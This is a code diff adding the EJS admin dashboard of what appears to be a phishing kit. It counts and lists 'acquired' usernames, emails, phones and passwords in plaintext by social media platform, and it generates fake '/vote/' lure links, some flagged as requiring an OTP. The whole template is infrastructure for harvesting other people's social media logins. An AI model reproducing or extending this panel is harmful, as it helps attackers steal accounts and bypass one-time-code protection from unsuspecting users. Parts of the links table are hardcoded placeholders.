@@ -1,0 +1,145 @@
+<div class="main-panel">
+  <div class="content-wrapper">
+    <div class="row">
+      <div class="col-xl-3 col-sm-6 grid-margin stretch-card">
+        <div class="card">
+          <div class="card-body">
+            <div class="row">
+              <div class="col-9">
+                <div class="d-flex align-items-center align-self-start">
+                  <h3 class="mb-0"><%= credentialscount %></h3>
+                </div>
+              </div>
+              <div class="col-3">
+                <div class="icon icon-box-success">
+                  <span class="mdi mdi-key icon-item"></span>
+                </div>
+              </div>
+            </div>
+            <h6 class="text-muted font-weight-normal">Acquired Credentials</h6>
+            <a href="/credentials" class="btn btn-secondary">See all</a>
+          </div>
+        </div>
+      </div>
+      <div class="col-xl-3 col-sm-6 grid-margin stretch-card">
+        <div class="card">
+          <div class="card-body">
+            <div class="row">
+              <div class="col-9">
+                <div class="d-flex align-items-center align-self-start">
+                  <h3 class="mb-0"><%= linkscount %></h3>
+                </div>
+              </div>
+              <div class="col-3">
+                <div class="icon icon-box-success">
+                  <span class="mdi mdi-link icon-item"></span>
+                </div>
+              </div>
+            </div>
+            <h6 class="text-muted font-weight-normal">Links</h6>
+            <div>
+              <a href="/credentials" class="btn btn-secondary">See all</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="row">
+      <div class="grid-margin">
+        <div class="container">
+          <a href="/create-link" class="btn btn-success my-3">Generate Link </a>
+        </div>
+      </div>
+    </div>
+
+    <div class="row text-white">
+      <div class="col-12 grid-margin">
+        <div class="card">
+          <div class="card-body">
+            <h4 class="card-title">Recent Credentials</h4>
+            <div class="table-responsive">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th class="text-white">Credentials</th>
+                    <th class="text-white">Social Media</th>
+                    <th class="text-white">Link Name</th>
+                    <th class="text-white">Date</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <% credentials.slice(0,11).forEach(c => {%>
+                  <tr>
+                    <td class="text-white">
+                      <p class="text-white">
+                        Email/Phone/username: <%= c.fields.username %>
+                      </p>
+                      <p class="text-white">
+                        Password: <%= c.fields.password %>
+                      </p>
+                    </td>
+                    <td class="text-white"><%= c.linkType %></td>
+                    <td class="text-white"><%= c.linkName %></td>
+                    <td class="text-white"><%= c.date %></td>
+                  </tr>
+                  <%})%>
+                </tbody>
+              </table>
+
+              <% if(credentialscount > 10){%>
+              <div>
+                <a href="/credentials" class="btn btn-secondary">See all</a>
+              </div>
+              <%}%>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="row text-white">
+      <div class="col-12 grid-margin">
+        <div class="card">
+          <div class="card-body">
+            <h4 class="card-title">Recent Links</h4>
+            <div class="table-responsive">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th class="text-white">Link</th>
+                    <th class="text-white">Social Media</th>
+                    <th class="text-white">Requires OTP</th>
+                    <th class="text-white">Date</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <% links.slice(0,11).forEach(l => {%>
+                  <tr>
+                    <td class="text-white">
+                      <a
+                        target="_blank"
+                        href="<%=req.app.locals.voteUrl%>/vote/<%= l.link %>"
+                        ><%=req.app.voteUrl%>/vote/<%= l.link %></a
+                      >
+                    </td>
+                    <td class="text-white">Instagram</td>
+                    <td class="text-white">Yes</td>
+                    <td class="text-white">04 Dec 2023 12:23pm</td>
+                  </tr>
+                  <%})%>
+                </tbody>
+              </table>
+
+              <% if(linkscount > 10){%>
+              <div>
+                <a href="/links" class="btn btn-secondary">See all</a>
+              </div>
+              <%}%>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
